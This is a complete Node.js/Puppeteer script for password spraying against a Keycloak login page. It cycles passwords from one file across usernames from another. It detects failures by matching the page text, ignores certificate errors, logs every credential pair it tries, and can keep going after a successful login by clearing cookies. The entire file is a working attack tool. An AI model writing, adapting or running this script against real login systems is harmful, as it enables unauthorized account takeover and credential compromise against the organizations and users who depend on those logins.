import puppeteer from 'puppeteer';
import { promises as fs } from 'fs';
import minimist from 'minimist';

const args = minimist(process.argv.slice(2));

const showHelp = () => {
    console.log(`
Usage: node script.js --target=<url> --logins=<logins file> --passwords=<passwords file> [--output=<output file>] [--delay=<delay in ms>] [--debug] [--continue]

Options:
  --target      URL of the Keycloak login page (required)
  --logins      File with list of logins (required)
  --passwords   File with list of passwords (required)
  --output      Output file for logging (default: output.log)
  --delay       Delay between login attempts in milliseconds (default: 1000)
  --debug       Enable debug mode with additional logs and GUI mode
  --continue    Continue attempting logins even after a successful login (reset cookies)
  --help        Show this help message
    `);
};

if (args.help) {
    showHelp();
    process.exit(0);
}

const { target, logins, passwords, output = 'output.log', delay = 1000, debug = false, continue: continueOnSuccess = false } = args;
if (!target || !logins || !passwords) {
    console.error('Error: Missing required arguments --target, --logins, or --passwords. Use --help for more information.');
    showHelp();
    process.exit(1);
}

const readLinesFromFile = async (filePath) => {
    const data = await fs.readFile(filePath, 'utf-8');
    return data.split('\n').filter(line => line.trim());
};

const delayBetweenAttempts = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const logResult = async (message) => {
    if (debug) console.log(`[DEBUG] ${message}`);
    await fs.appendFile(output, `${message}\n`);
};

const waitForForm = async (page) => {
    try {
        await page.waitForSelector('form#kc-form-login', { timeout: 60000 });
        await page.waitForSelector('input[name="username"]', { timeout: 60000 });
        await page.waitForSelector('input[name="password"]', { timeout: 60000 });
        if (debug) console.log('[DEBUG] Login form is available');
    } catch (error) {
        throw new Error(`Login form not found or took too long to appear: ${error}`);
    }
};


const clearAndType = async (page, selector, value) => {
    await page.focus(selector);
    await page.keyboard.down('Control');
    await page.keyboard.press('A');
    await page.keyboard.up('Control');
    await page.keyboard.press('Backspace');
    await page.type(selector, value);
};

const attemptLogin = async (page, login, password) => {
    try {
        if (debug) console.log(`[DEBUG] Attempting login with ${login}:${password}`);


        await clearAndType(page, 'input[name="username"]', login);
        await clearAndType(page, 'input[name="password"]', password);
        await page.click('#kc-login');

        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 60000 });

        const pageContent = await page.content();
        if (pageContent.includes('Invalid username or password')) {
            await logResult(`Login failed for ${login}:${password} - Invalid username or password`);
            return false;
        }

        if (debug) console.log(`[DEBUG] Login successful for ${login}:${password}`);
        await logResult(`Login successful for ${login}:${password}`);
        return true;
    } catch (error) {
        await logResult(`Error during login for ${login}:${password}: ${error.message}`);
        return false;
    }
};

const resetCookies = async (page) => {
    if (debug) console.log('[DEBUG] Resetting cookies');
    const client = await page.target().createCDPSession();
    await client.send('Network.clearBrowserCookies');
    await client.send('Network.clearBrowserCache');
};

const passwordSpraying = async () => {
    const browser = await puppeteer.launch({
        headless: !debug,
        args: ['--ignore-certificate-errors'],
        defaultViewport: null
    });

    const page = await browser.newPage();
    await page.setRequestInterception(true);

    page.on('request', request => {
        request.continue();
    });

    if (debug) console.log(`[DEBUG] Starting password spraying on ${target}`);
    await page.goto(target, { waitUntil: 'networkidle0', timeout: 60000 });

    await waitForForm(page);

    const loginList = await readLinesFromFile(logins);
    const passwordList = await readLinesFromFile(passwords);

    for (const password of passwordList) {
        for (const login of loginList) {
            const success = await attemptLogin(page, login, password);
            if (success && !continueOnSuccess) {
                if (debug) console.log(`[DEBUG] Stopping as successful login was found for ${login}`);
                await browser.close();
                return;
            }
            if (success && continueOnSuccess) {
                if (debug) console.log(`[DEBUG] Login successful, but continuing due to --continue flag. Resetting cookies.`);
                await resetCookies(page);
            }
            await delayBetweenAttempts(delay);
        }
    }

    if (debug) console.log('[DEBUG] Password spraying complete');
    await browser.close();
};

passwordSpraying().catch(error => {
    console.error(`Error during spraying: ${error.message}`);
});
